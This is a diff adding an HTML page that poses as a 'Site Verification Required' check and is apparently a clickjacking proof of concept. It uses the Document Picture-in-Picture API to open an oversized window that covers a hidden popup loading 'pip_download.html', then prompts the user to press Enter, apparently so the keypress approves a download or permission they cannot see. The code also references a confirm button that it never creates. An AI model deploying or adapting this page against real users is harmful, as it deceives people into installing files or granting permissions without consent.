@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Simple 2-Step PiP Game</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      background-color: #0dd438;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+
+    .step-heading {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <center style="position: absolute; top: 300px;">
+    <h2>Site Verification Required</h2>
+  </center>
+  <button id="open-pip-button" onclick="openPip()">Verify</button>
+
+  <script>
+    let pipWindow;
+    let popupWindow; // Reference to the permission popup
+
+    async function openPip() {
+      try {
+        pipWindow = await documentPictureInPicture.requestWindow({
+          width: 50000,
+          height: 25000,
+        });
+
+        const style = pipWindow.document.createElement('style');
+        style.textContent = `
+          body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+          }
+          .step-heading, #message, #confirm-button, #exit-message, #start-button  {
+            font-size: 24px;
+            text-align: center;
+          }
+          #message, #confirm-button, #exit-message, #start-button  {
+            display: none;
+            font-weight: bold;
+            margin-top: 20px;
+          }
+          #confirm-button, #start-button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #0dd438;
+            color: white;
+            border: none;
+            border-radius: 5px;
+          }
+        `;
+        pipWindow.document.head.appendChild(style);
+
+        // Create and add elements to PiP window
+        createAndAppendElement(pipWindow, 'button', 'start-button', 'Click to Start 2-Step Verification process');
+        createAndAppendElement(pipWindow, 'div', 'step1-heading', 'Wait', 'none', 'step-heading');
+        createAndAppendElement(pipWindow, 'div', 'message', 'Enter For Complete', 'none');
+        createAndAppendElement(pipWindow, 'div', 'step2-heading', 'Step 2:', 'none', 'step-heading');
+        createAndAppendElement(pipWindow, 'div', 'exit-message', 'Press Enter to Exit', 'none');
+
+        // Delay the display of the 'message' div by 3 seconds
+		setTimeout(() => {
+          pipWindow.document.getElementById('step1-heading').style.display = 'none';
+        }, 5999);
+
+        setTimeout(() => {
+          pipWindow.document.getElementById('message').style.display = 'block';
+        }, 6000);
+
+        // Add event listeners
+        addEventListeners(pipWindow);
+
+      } catch (error) {
+        console.error('Error opening PiP window:', error);
+      }
+    }
+
+    function createAndAppendElement(pipWindow, tagName, id, textContent, display = 'block', className = '') {
+      const element = pipWindow.document.createElement(tagName);
+      element.id = id;
+      element.textContent = textContent;
+      element.style.display = display;
+      if (className) {
+        element.className = className;
+      }
+      pipWindow.document.body.appendChild(element);
+    }
+
+    function addEventListeners(pipWindow) {
+      // Start button click event
+      const startButton = pipWindow.document.getElementById('start-button');
+      startButton.addEventListener('click', () => {
+        const popupWidth = 100;
+        const popupHeight = 100;
+        const left = (window.screen.width - popupWidth) / 2;
+        const top = (window.screen.height - popupHeight) / 2;
+        popupWindow = window.open('pip_download.html', 'popupWindow', `width=${popupWidth},height=${popupHeight},left=${left},top=${top}`);
+        startButton.style.display = 'none';
+        pipWindow.document.getElementById('step1-heading').style.display = 'block';
+        pipWindow.document.getElementById('confirm-button').style.display = 'block';
+      });
+
+      // Confirm button click event
+      const confirmButton = pipWindow.document.getElementById('confirm-button');
+      confirmButton.addEventListener('click', () => {
+        pipWindow.document.getElementById('step1-heading').style.display = 'none';
+        pipWindow.document.getElementById('message').style.display = 'none';
+        confirmButton.style.display = 'none';
+        pipWindow.document.getElementById('step2-heading').style.display = 'block';
+        pipWindow.document.getElementById('exit-message').style.display = 'block';
+      });
+
+      // Exit on Enter key press
+      pipWindow.addEventListener('keydown', (event) => {
+        if (event.key === 'Enter') {
+          pipWindow.close();
+          // Close the permission popup after few seconds
+          setTimeout(() => {
+            if (popupWindow) {
+              popupWindow.close();
+            }
+          }, 500);
+        }
+      });
+    }
+  </script>
+</body>
+
+</html>
